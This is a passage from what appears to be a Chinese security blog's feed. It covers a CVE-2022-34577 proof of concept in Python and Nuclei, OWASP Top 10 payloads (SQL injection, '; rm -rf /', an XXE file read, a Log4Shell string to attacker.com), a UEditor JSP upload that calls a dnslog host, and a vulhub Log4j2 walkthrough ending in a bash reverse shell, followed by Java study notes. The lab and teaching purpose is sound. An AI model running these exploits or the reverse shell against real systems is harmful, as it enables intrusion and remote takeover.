如果漏洞存在，执行上述命令后，能在返回的内容中看到类似 <code>uid=0(root) gid=0(root)</code> 的字符串。</p></li></ol><h4 id="形式二：更灵活的-PoC-使用-Python-脚本"><a href="#形式二：更灵活的-PoC-使用-Python-脚本" class="headerlink" title="形式二：更灵活的 PoC - 使用 Python 脚本"></a>形式二：更灵活的 PoC - 使用 Python 脚本</h4><p>Python 脚本让 PoC 更具可读性、可重用性，并且可以加入自动化验证逻辑。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-comment"># ----------------- 配置 -----------------</span><br><span class="hljs-comment"># 从命令行参数获取目标IP，如果没有则提示并退出</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;用法: python poc.py &lt;目标IP地址&gt;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;例如: python poc.py 192.168.1.1&quot;</span>)<br>    sys.exit(<span class="hljs-number">1</span>)<br><br>target_ip = sys.argv[<span class="hljs-number">1</span>]<br>url = <span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;target_ip&#125;</span>/adm.cgi&quot;</span><br><br><span class="hljs-comment"># ----------------- 载荷 -----------------</span><br><span class="hljs-comment"># 我们要执行的无害命令</span><br>command = <span class="hljs-string">&quot;id&quot;</span><br><span class="hljs-comment"># 根据漏洞要求，对命令进行 Base64 编码</span><br><span class="hljs-comment"># 注意：要编码 bytes，而不是 str</span><br>encoded_command = base64.b64encode(command.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-comment"># ----------------- 构造请求 -----------------</span><br><span class="hljs-comment"># POST 请求的 body 数据</span><br>data = &#123;<br>    <span class="hljs-string">&quot;cmd&quot;</span>: encoded_command<br>&#125;<br><span class="hljs-comment"># 请求头</span><br>headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br><span class="hljs-comment"># ----------------- 发送请求并验证 -----------------</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 正在向 <span class="hljs-subst">&#123;url&#125;</span> 发送恶意请求...&quot;</span>)<br>    response = requests.post(url, data=data, headers=headers, timeout=<span class="hljs-number">10</span>)<br><br>    <span class="hljs-comment"># 验证逻辑：检查响应内容中是否包含&#x27;id&#x27;命令的特征输出</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;uid=&quot;</span> <span class="hljs-keyword">in</span> response.text <span class="hljs-keyword">and</span> <span class="hljs-string">&quot;gid=&quot;</span> <span class="hljs-keyword">in</span> response.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[!!!] 漏洞存在！ CVE-2022-34577&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 命令执行结果:&quot;</span>)<br>        <span class="hljs-built_in">print</span>(response.text)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[-] 目标似乎不受此漏洞影响。&quot;</span>)<br><br><span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n[X] 请求失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br></code></pre></td></tr></table></figure><p><strong>如何运行这个Python PoC:</strong></p><ol><li>将代码保存为 <code>poc.py</code>。</li><li>安装 <code>requests</code> 库: <code>pip install requests</code>。</li><li>在命令行中运行: <code>python poc.py &lt;目标设备的IP地址&gt;</code>。</li></ol><h4 id="形式三：自动化的-PoC-Nuclei-模板"><a href="#形式三：自动化的-PoC-Nuclei-模板" class="headerlink" title="形式三：自动化的 PoC - Nuclei 模板"></a>形式三：自动化的 PoC - Nuclei 模板</h4><p>Nuclei 模板是用于大规模、自动化扫描的 PoC。它将请求和验证逻辑声明化。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># ... (info 块) ...</span><br><span class="hljs-attr">http:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">method:</span> <span class="hljs-string">POST</span>              <span class="hljs-comment"># 1. 使用 POST 方法</span><br>    <span class="hljs-attr">path:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;<span class="hljs-template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/adm.cgi&quot;</span> <span class="hljs-comment"># 2. 目标路径是 /adm.cgi</span><br><br>    <span class="hljs-attr">body:</span> <span class="hljs-string">&quot;cmd=<span class="hljs-template-variable">&#123;&#123;base64(&#x27;id&#x27;)&#125;&#125;</span>&quot;</span> <span class="hljs-comment"># 3. Body是cmd=... Nuclei的&#123;&#123;base64(&#x27;id&#x27;)&#125;&#125;会自动完成编码</span><br><br>    <span class="hljs-attr">headers:</span><br>      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">application/x-www-form-urlencoded</span> <span class="hljs-comment"># 请求头</span><br>      <br>    <span class="hljs-attr">matchers-condition:</span> <span class="hljs-string">and</span>    <span class="hljs-comment"># 4. 验证条件：下面的两个 matcher 必须同时满足</span><br>    <span class="hljs-attr">matchers:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;uid=&quot;</span>             <span class="hljs-comment"># 5. 第一个条件：响应内容中必须包含 &quot;uid=&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;gid=&quot;</span>             <span class="hljs-comment">#    和 &quot;gid=&quot;</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <br>      <span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">word</span><br>        <span class="hljs-attr">words:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&lt;html&gt;&quot;</span>           <span class="hljs-comment"># 6. 第二个条件：响应内容中不能包含 &quot;&lt;html&gt;&quot;</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;&lt;script&gt;&quot;</span>         <span class="hljs-comment">#    或 &quot;&lt;script&gt;&quot;</span><br>        <span class="hljs-attr">part:</span> <span class="hljs-string">body</span><br>        <span class="hljs-attr">negative:</span> <span class="hljs-literal">true</span>         <span class="hljs-comment">#    negative: true 的意思是“不包含”</span><br></code></pre></td></tr></table></figure><p>这个 <code>negative: true</code> 的匹配器非常聪明，它排除了那些虽然返回错误但可能会反射我们输入内容的正常HTML页面，从而大大降低了误报率。</p><hr><h3 id="总结：编写-PoC-的核心思想"><a href="#总结：编写-PoC-的核心思想" class="headerlink" title="总结：编写 PoC 的核心思想"></a>总结：编写 PoC 的核心思想</h3><ol><li><strong>理解原理：</strong> 知道是什么漏洞类型（SQL注入、RCE、XSS等）。</li><li><strong>确定目标：</strong> 找到脆弱的 URL、参数和请求方法。</li><li><strong>选择载荷：</strong> 使用最简单、无害、有明显特征的载荷来证明漏洞。</li><li><strong>构建请求：</strong> 使用 <code>curl</code>、Python 或其他工具发送构造好的请求。</li><li><strong>验证结果：</strong> 检查响应中是否包含你预期的特征（如<code>uid=</code>、特定的延迟、弹窗等）。</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>OWASP漏洞</title>
    <link href="/2025/03/23/OWASP%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/03/23/OWASP%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="owasp十大漏洞知识点"><a href="#owasp十大漏洞知识点" class="headerlink" title="owasp十大漏洞知识点"></a>owasp十大漏洞知识点</h1><hr><h3 id="1-注入（Injection）"><a href="#1-注入（Injection）" class="headerlink" title="1. 注入（Injection）"></a>1. <strong>注入（Injection）</strong></h3><ul><li><strong>原理</strong>：攻击者将恶意数据（如SQL、OS命令、NoQL）插入解释器中，欺骗解释器执行非预期命令。</li><li><strong>利用方式</strong>：<ul><li><strong>SQL注入</strong>：<code>&#39; OR &#39;1&#39;=&#39;1</code> 绕过登录；<code>UNION SELECT</code> 窃取数据。</li><li><strong>命令注入</strong>：<code>; rm -rf /</code> 在参数中拼接系统命令。</li><li><strong>NoSQL注入</strong>：<code>&#123;&quot;$ne&quot;: &quot;1&quot;&#125;</code> 绕过MongoDB查询。</li></ul></li><li><strong>防御</strong>：参数化查询（Prepared Statements）、输入验证、ORM框架、最小权限原则。</li></ul><hr><h3 id="2-失效的身份认证（Broken-Authentication）"><a href="#2-失效的身份认证（Broken-Authentication）" class="headerlink" title="2. 失效的身份认证（Broken Authentication）"></a>2. <strong>失效的身份认证（Broken Authentication）</strong></h3><ul><li><strong>原理</strong>：身份验证或会话管理机制存在缺陷，导致账户被接管。</li><li><strong>利用方式</strong>：<ul><li>暴力破解弱密码（如<code>admin/password</code>）。</li><li>窃取Session ID（XSS、网络嗅探）。</li><li>滥用密码重置逻辑（如未验证邮箱所有权）。</li></ul></li><li><strong>防御</strong>：多因素认证（MFA）、强密码策略、安全存储Session、HTTPS加密。</li></ul><hr><h3 id="3-敏感数据泄露（Sensitive-Data-Exposure）"><a href="#3-敏感数据泄露（Sensitive-Data-Exposure）" class="headerlink" title="3. 敏感数据泄露（Sensitive Data Exposure）"></a>3. <strong>敏感数据泄露（Sensitive Data Exposure）</strong></h3><ul><li><strong>原理</strong>：未加密或弱加密保护敏感数据（密码、信用卡号）。</li><li><strong>利用方式</strong>：<ul><li>窃取未加密的传输数据（中间人攻击）。</li><li>获取备份数据库（如AWS S3公开访问）。</li></ul></li><li><strong>防御</strong>：TLS加密传输、静态数据加密（AES-256）、禁用缓存敏感数据、密钥管理。</li></ul><hr><h3 id="4-XML外部实体（XXE）"><a href="#4-XML外部实体（XXE）" class="headerlink" title="4. XML外部实体（XXE）"></a>4. <strong>XML外部实体（XXE）</strong></h3><ul><li><strong>原理</strong>：解析恶意XML时，引用外部实体导致文件读取&#x2F;SSRF。</li><li><strong>利用方式</strong>：<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>读取服务器文件或发起内网请求。</li><li><strong>防御</strong>：禁用DTD&#x2F;外部实体（如<code>libxml_disable_entity_loader</code>）、使用JSON替代XML。</li></ul><hr><h3 id="5-失效的访问控制（Broken-Access-Control）"><a href="#5-失效的访问控制（Broken-Access-Control）" class="headerlink" title="5. 失效的访问控制（Broken Access Control）"></a>5. <strong>失效的访问控制（Broken Access Control）</strong></h3><ul><li><strong>原理</strong>：未对用户权限进行校验，允许越权操作。</li><li><strong>利用方式</strong>：<ul><li>修改URL参数（如<code>/user?id=123</code> → <code>id=124</code>）访问他人数据。</li><li>未授权访问管理接口（如<code>/admin</code> 无鉴权）。</li></ul></li><li><strong>防御</strong>：RBAC权限模型、服务端校验所有权、默认拒绝原则。</li></ul><hr><h3 id="6-安全配置错误（Security-Misconfiguration）"><a href="#6-安全配置错误（Security-Misconfiguration）" class="headerlink" title="6. 安全配置错误（Security Misconfiguration）"></a>6. <strong>安全配置错误（Security Misconfiguration）</strong></h3><ul><li><strong>原理</strong>：默认配置、冗余功能、错误HTTP头导致暴露漏洞。</li><li><strong>利用方式</strong>：<ul><li>访问未删除的调试页面（如<code>/phpinfo.php</code>）。</li><li>利用默认密码登录（Tomcat <code>admin:admin</code>）。</li></ul></li><li><strong>防御</strong>：最小化安装、定期扫描配置、自动化部署（如Ansible）、禁用目录列表。</li></ul><hr><h3 id="7-跨站脚本（XSS）"><a href="#7-跨站脚本（XSS）" class="headerlink" title="7. 跨站脚本（XSS）"></a>7. <strong>跨站脚本（XSS）</strong></h3><ul><li><strong>原理</strong>：恶意脚本注入到网页中，在用户浏览器执行。</li><li><strong>类型与利用</strong>：<ul><li><strong>反射型XSS</strong>：通过钓鱼链接传播（<code>http://site.com?search=&lt;script&gt;alert(1)&lt;/script&gt;</code>）。</li><li><strong>存储型XSS</strong>：恶意评论存入数据库，所有用户加载时触发。</li><li><strong>DOM型XSS</strong>：前端JS操作DOM时未转义（如<code>document.write(location.hash)</code>）。</li></ul></li><li><strong>防御</strong>：输出编码（HTML&#x2F;JS&#x2F;CSS）、CSP策略、输入验证、<code>HttpOnly</code> Cookie。</li></ul><hr><h3 id="8-不安全的反序列化（Insecure-Deserialization）"><a href="#8-不安全的反序列化（Insecure-Deserialization）" class="headerlink" title="8. 不安全的反序列化（Insecure Deserialization）"></a>8. <strong>不安全的反序列化（Insecure Deserialization）</strong></h3><ul><li><strong>原理</strong>：反序列化恶意数据导致远程代码执行（RCE）或权限提升。</li><li><strong>利用方式</strong>：<ul><li>Java反序列化漏洞（如Apache Commons Collections）。</li><li>篡改Cookie中的序列化对象提升权限。</li></ul></li><li><strong>防御</strong>：避免反序列化用户输入、使用JSON、签名验证数据完整性。</li></ul><hr><h3 id="9-使用含已知漏洞的组件（Vulnerable-Components）"><a href="#9-使用含已知漏洞的组件（Vulnerable-Components）" class="headerlink" title="9. 使用含已知漏洞的组件（Vulnerable Components）"></a>9. <strong>使用含已知漏洞的组件（Vulnerable Components）</strong></h3><ul><li><strong>原理</strong>：第三方库（如Log4j、Struts）存在公开漏洞。</li><li><strong>利用方式</strong>：<ul><li>CVE-2021-44228（Log4Shell）：<code>$&#123;jndi:ldap://attacker.com/exp&#125;</code> 触发RCE。</li></ul></li><li><strong>防御</strong>：依赖扫描工具（OWASP Dependency-Check）、定期更新、移除无用依赖。</li></ul><hr><h3 id="10-日志与监控不足（Insufficient-Logging-Monitoring）"><a href="#10-日志与监控不足（Insufficient-Logging-Monitoring）" class="headerlink" title="10. 日志与监控不足（Insufficient Logging &amp; Monitoring）"></a>10. <strong>日志与监控不足（Insufficient Logging &amp; Monitoring）</strong></h3><ul><li><strong>原理</strong>：未记录关键事件（登录失败、异常请求），导致攻击无法追溯。</li><li><strong>利用方式</strong>：攻击者横向移动而不触发告警（如数据窃取数月未被发现）。</li><li><strong>防御</strong>：集中化日志（ELK&#x2F;Splunk）、实时监控、设置告警阈值（如5分钟内20次登录失败）。</li></ul><hr><h3 id="关键防御策略"><a href="#关键防御策略" class="headerlink" title="关键防御策略"></a>关键防御策略</h3><ol><li><strong>纵深防御</strong>：多层安全措施（WAF+输入校验+编码+最小权限）。</li><li><strong>自动化工具</strong>：SAST&#x2F;DAST扫描（如ZAP、Burp Suite）、依赖检查。</li><li><strong>安全意识</strong>：开发人员安全培训（如安全编码规范）。</li><li><strong>威胁建模</strong>：设计阶段识别潜在风险（如STRIDE模型）。</li></ol>]]></content>
    
    
    <categories>
      
      <category>web漏洞</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ueditor</title>
    <link href="/2025/03/21/ueditor/"/>
    <url>/2025/03/21/ueditor/</url>
    
    <content type="html"><![CDATA[<p>搭建临时网站f7msgp.dnslog.cn</p><h4 id="上传恶意-JSP-文件"><a href="#上传恶意-JSP-文件" class="headerlink" title="上传恶意 JSP 文件"></a><strong>上传恶意 JSP 文件</strong></h4><p><strong>上传接口</strong>：<code>/ueditor/jsp/controller.jsp?action=uploadfile</code></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dart">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.net.URL&quot;</span> %&gt;<br>&lt;%<br>  <span class="hljs-built_in">String</span> dnsDomain = <span class="hljs-string">&quot;abc123.dnslog.cn&quot;</span>;  <span class="hljs-comment">// 替换为你的DNSLog域名</span><br>  <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-comment">// 触发DNS解析请求</span><br>      <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;http://&quot;</span> + dnsDomain).openConnection().connect();<br>      out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;DNSLog Triggered&quot;</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>      out.<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: &quot;</span> + e.getMessage());<br>  &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><p>抓post包</p><p><img src="/../images/image-20250723153529454.png" alt="image-20250723153529454"></p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CTF-XSS</title>
    <link href="/2025/03/19/CTF-XSS/"/>
    <url>/2025/03/19/CTF-XSS/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5f34ce35e09fc69687a622eef586631df35a5d87e26b9c4852bd185dc81ee122"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这是我的私人空间，请勿随意查看。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>CTF靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j2的JNDI注入漏洞复现</title>
    <link href="/2025/03/15/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/03/15/Log4j2%E7%9A%84JNDI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="Log4j2的JNDI注入漏洞复现"><a href="#Log4j2的JNDI注入漏洞复现" class="headerlink" title="Log4j2的JNDI注入漏洞复现"></a>Log4j2的JNDI注入漏洞复现</h1><p>参考文章：</p><p><a href="https://www.freebuf.com/vuls/316143.html">https://www.freebuf.com/vuls/316143.html</a></p><p><a href="https://www.cnblogs.com/0dot7/p/17259327.html">https://www.cnblogs.com/0dot7/p/17259327.html</a></p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><h3 id="关于Log4j2"><a href="#关于Log4j2" class="headerlink" title="关于Log4j2"></a>关于Log4j2</h3><p>Log4j2是一个Java日志组件，被各类Java框架广泛地使用。它的前身是Log4j，Log4j2重新构建和设计了框架，可以认为两者是完全独立的两个日志组件，但是因为存在前身Log4j，而且都是Apache下的项目，不管是jar包名称还是package名称，看起来都很相似</p><h3 id="Log4j2-Lookup"><a href="#Log4j2-Lookup" class="headerlink" title="Log4j2 Lookup"></a>Log4j2 Lookup</h3><p>Log4j2的Lookup允许在日志配置和日志消息中动态插入变量值，这些变量可以是外部环境变量，也可以是MDC中的变量，还可以是日志上下文数据等。</p><p>格式类似”${type:var}”，即可以实现对变量var的引用。type可以是如下值：</p><ol><li>ctx：允许程序将数据存储在 Log4j <code>ThreadContext</code>Map 中，然后在日志输出过程中，查找其中的值。</li><li>env：允许系统在全局文件（如 &#x2F;etc&#x2F;profile）或应用程序的启动脚本中配置环境变量，然后在日志输出过程中，查找这些变量。例如：<code>$&#123;env:USER&#125;</code>。</li><li>java：允许查找Java环境配置信息。例如：<code>$&#123;java:version&#125;</code>。</li><li>jndi：允许通过 JNDI 检索变量。</li><li>…</li></ol><p>这次漏洞就跟jndi有关，我们接下来了解一下jndi注入的漏洞成因</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>JNDI（Java Naming and Directory  Interface，Java命名和目录接口），是Java提供的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 。</p><p>JNDI还支持从指定的远程服务器上下载class文件，加载到本地JVM中，并通过适当的方式创建对象。这里就是漏洞的主要来源</p><p>由于Log4j 的 JNDI 支持并没有限制可以解析的名称。一些协议像rmi:和ldap:是不安全的或者可以允许远程代码执行。攻击者在可以控制日志内容的情况下，通过传入类似于<code>$&#123;jndi:ldap://evil.com/example&#125;</code>的lookup用于进行JNDI注入，执行任意代码。</p><p><strong><code>rmi:</code> 协议</strong></p><ul><li><strong>RMI（Remote Method Invocation）</strong> 是 Java 提供的远程方法调用机制，允许一个 Java 虚拟机（JVM）调用另一个 JVM 上的对象方法。</li><li>在 Log4j2 漏洞中，攻击者可以通过 <code>rmi:</code> 协议指向一个恶意的 RMI 服务器，从而触发远程代码执行。</li></ul><p><strong><code>ldap:</code> 协议</strong></p><ul><li><strong>LDAP（Lightweight Directory Access Protocol）</strong> 是一种用于访问目录服务的协议，常用于企业中的身份验证和资源管理。</li><li>在 Log4j2 漏洞中，攻击者可以通过 <code>ldap:</code> 协议指向一个恶意的 LDAP 服务器，返回一个恶意类或序列化对象，从而触发远程代码执行。</li></ul><p>我们举个例子</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$&#123;</span><span class="hljs-symbol">jndi:</span><span class="hljs-symbol">ldap:</span>/<span class="hljs-regexp">/127.0.0.1/shell</span>&#125;<br></code></pre></td></tr></table></figure><p>当我们传入这个字符串的时候，log4j2组件就会将信息记录到日志中，并且log4j2会尝试解析这些信息，通过jndi的lookup()方法去解析该URL：ldap:&#x2F;&#x2F;127.0.0.1&#x2F;shell，由于是ldap协议，所以就会去该地址下的ldap服务中寻找名为shell的资源，找到后将资源信息返回给组件，之后log4j2组件就会下载下来，假如我们的shell文件的一个恶意的.class文件，那就会执行里面的代码，从而造成注入</p><h2 id="环境搭建-漏洞复现"><a href="#环境搭建-漏洞复现" class="headerlink" title="环境搭建&amp;漏洞复现"></a>环境搭建&amp;漏洞复现</h2><p>vulhub靶场有现成的环境</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cd</span> vulhub/log4j/CVE-<span class="hljs-number">2021</span>-<span class="hljs-number">44228</span>/<br><span class="hljs-attribute">docker</span>-compose up -d<br></code></pre></td></tr></table></figure><p>使用vulhub靶场，启动一个Apache Solr 8.11.0，其依赖了Log4j 2.14.1</p><p>起环境后访问8983端口</p><p><img src="/%5Cimages%5CLog4j2-1.png"></p><p>然后我们对网站进行测试，用一个dns服务器起一个域名，这里我用yakit的dns服务器</p><p><img src="/%5Cimages%5CLog4j2-2.png"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>&#123;jndi:ldap:<span class="hljs-comment">//wsythhvyqt.dgrh3.cn&#125;</span><br></code></pre></td></tr></table></figure><p>利用JNDI发送DNS请求的Payload，并且在dns服务器上成功收到回显</p><p>然后就是漏洞利用了</p><p>使用JNDI注入工具</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">工具地址：https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/welk1n/</span>JNDI-Injection-Exploit<br></code></pre></td></tr></table></figure><p>然后我们构造反弹shell</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/vps.ip/port <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>然后用工具进行注入</p><p><img src="/%5Cimages%5CLog4j2-3.png"></p><p>我这里版本是jdk1.8的，所以直接传就行，然后监听端口就可以收到了</p><p><img src="/%5Cimages%5CLog4j2-4.png"></p><p>到此靶场的复现就完成了</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JAVA</title>
    <link href="/2025/03/14/JAVA/"/>
    <url>/2025/03/14/JAVA/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1><hr><h3 id="第一章-绪论"><a href="#第一章-绪论" class="headerlink" title="第一章 绪论"></a><strong>第一章 绪论</strong></h3><h4 id="核心考点"><a href="#核心考点" class="headerlink" title="核心考点"></a><strong>核心考点</strong></h4><ol><li><p><strong>Java语言特点</strong>（单选题&#x2F;简答题）</p><ul><li><strong>跨平台性</strong>（JVM实现）：<code>.java</code> → 编译为 <code>.class</code>字节码 → JVM解释执行（对比Python的<code>.py</code>→PVM）</li><li><strong>面向对象</strong>：完全OOP（连<code>main</code>都必须在类中），Python支持多范式</li><li><strong>自动内存管理</strong>：垃圾回收器GC（类似Python，但Java需手动触发<code>System.gc()</code>建议回收）</li><li><strong>强类型</strong>：变量必须声明类型（Python是动态类型）</li></ul></li><li><p><strong>Java运行原理</strong>（填空题）</p><pre><code class=" mermaid">graph LRA[.java源码] --&gt; B[javac编译]B --&gt; C[.class字节码]C --&gt; D[JVM加载]D --&gt; E[解释执行/即时编译JIT]</code></pre></li></ol><hr><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h3 id="Java运行原理（外卖平台类比）"><a href="#Java运行原理（外卖平台类比）" class="headerlink" title="Java运行原理（外卖平台类比）"></a><strong>Java运行原理（外卖平台类比）</strong></h3><ol><li><strong>您写代码</strong> &#x3D; 在美团后台创建新功能（<code>.java</code>文件）</li><li><strong>javac编译</strong> &#x3D; 美团技术团队打包成APP安装包（生成<code>.class</code>）</li><li><strong>JVM运行</strong> &#x3D; 用户手机安装美团APP（不同手机&#x3D;不同操作系统）</li><li><strong>跨平台</strong> &#x3D; 同一安装包在华为&#x2F;小米&#x2F;iPhone都能运行</li></ol><p>“Java要求所有代码必须包含在类中（包括main入口函数），通过创建对象来操作数据和方法。这符合面向对象的封装性（数据与操作绑定在类内）、继承性（extends实现代码复用）、多态性（父类引用指向子类对象）三大特征”</p><h3 id="第二章-Java语言基础"><a href="#第二章-Java语言基础" class="headerlink" title="第二章 Java语言基础"></a><strong>第二章 Java语言基础</strong></h3><h4 id="1-标识符规则（判断题）"><a href="#1-标识符规则（判断题）" class="headerlink" title="1. 标识符规则（判断题）"></a><strong>1. 标识符规则</strong>（判断题）</h4><ul><li>首字符：字母&#x2F;<code>_</code>&#x2F;<code>$</code>（<strong>不能数字开头</strong>，同Python）</li><li>区分大小写（<code>age</code>≠<code>Age</code>）</li><li><strong>禁止关键字</strong>（<code>int</code>, <code>class</code>等48个保留字）<blockquote><p>✅合法：<code>_name</code>, <code>$value</code><br>❌非法：<code>1var</code>（数字开头）, <code>public</code>（关键字）</p></blockquote></li></ul><h4 id="2-数据类型（填空题）"><a href="#2-数据类型（填空题）" class="headerlink" title="2. 数据类型（填空题）"></a><strong>2. 